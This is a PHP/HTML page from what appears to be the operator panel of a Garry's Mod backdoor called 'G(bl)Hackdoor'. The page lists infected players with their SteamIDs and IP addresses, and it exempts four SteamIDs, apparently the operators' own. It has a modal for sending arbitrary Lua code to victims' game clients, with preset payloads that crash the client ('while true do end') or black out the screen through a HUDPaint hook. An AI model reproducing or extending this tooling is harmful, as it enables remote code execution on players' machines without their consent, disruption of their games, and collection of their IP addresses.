<?php include('isdefault.php') ?>
            <div class="breadcome-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                            <div class="breadcome-list"><font color="white">
                                <p>
                                    <div class="input-group md-form form-sm form-2 pl-0">
                                        <input class="form-control my-0 py-1 red-border" type="text" placeholder="Search" aria-label="Search" id="myInputTextField">
                                    <div class="input-group-append">
                                    </div>
                                    </div>
                                </p>
            
                                    <table id="server_lisst" class="table table-dark" style="width:100%">
        <thead> 
            <tr>
                <th>Name</th>
                <th>SteamID</th>
                <th>Blacklist</th>
                <th>Address IP</th>
                <th style="min-width: 60px!important;">Actions</th>
            </tr>
        </thead>

        <tbody id="ilyadesserveurs">
            <?php 
 $selectionserver = $GLOBALS['DB']->GetContent("players_list");

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                     $ip_data = explode(':', $AfficheServer['server_ip']);
                     $blacklist = array("STEAM_0:0:34615906", "STEAM_0:1:186944016", "STEAM_0:1:220961040", "STEAM_0:0:213359776");
                     if (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:1:186944016"){
                        $ip = "HIDDEN";
                     }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:1:220961040") {
                        $ip = "HIDDEN";
                     }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:0:213359776"){
                        $ip = "HIDDEN";
                    }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:0:34615906"){
                        $ip = "HIDDEN";
                     }else {
                        if (IsAdmin($_SESSION['id'])){
                          $ip = htmlspecialchars($AfficheServer['ip']);
                        }else{
                          $ip  = "HIDDEN";
                        }
                     }

                     
                      
                     if (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:1:186944016"){
                        $button_hearth_console = "";
                     }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:1:220961040") {
                        $button_hearth_console = "";
                     }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:0:213359776"){
                        $button_hearth_console = "";
                    }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:0:34615906"){
                        $button_hearth_console = "";
                     }else {
                        $button_hearth_console = '<button onclick="setPlayerCode('.$data['id'].')" data-toggle="modal" data-target="#playeroff-modal" type="button" class="btn btn-primary btn-sm"><i class="fa fa-arrow-alt-circle-right"></i></button>';
                     }

                     if (IsAdmin($_SESSION['id'])){
                        if (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:1:186944016"){
                           $button_blacklist = "";
                        }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:1:220961040") {
                           $button_blacklist = "";
                        }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:0:213359776"){
                           $button_blacklist = "";
                       }elseif (htmlspecialchars($AfficheServer['steamid']) == "STEAM_0:0:34615906"){
                           $button_blacklist = "";
                        }else {
                           $button_blacklist = '<button onclick="Blacklist('.$data['steamid'].')"  type="button" class="btn btn-danger btn-sm"><i class="fa fa-arrow-alt-circle-right"></i></button>';
                        }
                       }

                     echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($AfficheServer['name']) . "</b></td>
                                <td><b>" . htmlspecialchars($AfficheServer['steamid']) . "</b></td>
                                <td><b>" . $AfficheServer["blacklist"] . "</b></td>
                                <td><b>" . $ip . "</b></td>
                                <td><b>" . $button_blacklist ."</b></td>
                            </tr>
                        ";
                        } 
    
            ?>
        </tbody>
    </table>
</font>
<div class="modal fade" id="playeroff-modal" tabindex="-1" role="dialog"  style="color:#1c1c1c; background-color: transparent;">
  <div class="modal-dialog" role="document">
    <div class="modal-content" style="color:white; background-color: #262626;">
      <div class="modal-header" style="color:white; background-color: #1c1c1c;">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Mettre le code</h4>
      </div>
      <div class="modal-body" id="playeroff-body">
          <div class="form-group">
            <label>Code</label>
            <textarea class="form-control" rows="10" id="playeroff-code" placeholder="Code a executer sur le client"></textarea>
<br />
<button onclick="pldd('while true do end')" type="button" class="btn btn-warning">Crasher</button>
<button onclick="pldd('hook.Add([[HUDPaint]], [[mdrdabed]],function()draw.RoundedBoxEx(0,0,0,ScrW(),ScrH(),Color(0,0,0))end)')" type="button" class="btn btn-danger">Ecran noire</button>
          </div>
          


      </div>
      <div class="modal-footer" id="playeroff-footer">
        <button type="button" class="btn btn-danger" data-dismiss="modal">Fermer</button>
        <button onclick="editPayload2()" type="button" class="btn btn-primary" data-dismiss="modal">Mettre</button>
      </div>
    </div>
  </div>
</div> 
<div class="dataTables_paginate paging_simple_numbers" id="server_lisst_paginate"><ul class="pagination"><li class="paginate_button previous disabled" id="server_lisst_previous"><a href="#" style="background-color: #152036; border-color: #253454;" aria-controls="server_lisst" data-dt-idx="0" tabindex="0">Previous</a></li><li class="paginate_button next disabled" id="server_lisst_next"><a href="#" aria-controls="server_lisst" data-dt-idx="1" style="background-color: #152036; border-color: #253454;" tabindex="0">Next</a></li></ul></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
        <div class="footer-copyright-area">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12">
                        <div class="footer-copy-right">
                            <p>Copyright © 2019 <a href="https://colorlib.com/wp/templates/">G(bl)Hackdoor</a> All rights reserved.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

<?php include('isdefault_down.php') ?>



<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script>
function Blacklist(steamid)
{
    $.ajax({
      url: "core/ajax/blacklist-user.php?steamid=" + steamid
    });
    
}
</script>
<script>
  $('#server_lisst').dataTable( {
    "iDisplayLength": 999999999,
    "bLengthChange": false,
    "oLanguage": {
        "sSearch": '<span>Recherche: </span>',
        "emptyTable": '<span>¯\_(ツ)_/¯ Pas de serveur ¯\_(ツ)_/¯</span>'
    }
  } );
    oTable = $('#server_lisst').DataTable();   //pay attention to capital D, which is mandatory to retrieve "api" datatables' object, as @Lionel said
$('#myInputTextField').keyup(function(){
      oTable.search($(this).val()).draw() ;
})
    setInterval('load_servers()', 14000);
   function load_servers() {
     $('#ilyadesserveurs').load('listed_ki_tue.php?theget=5');
   }
</script>
</html>
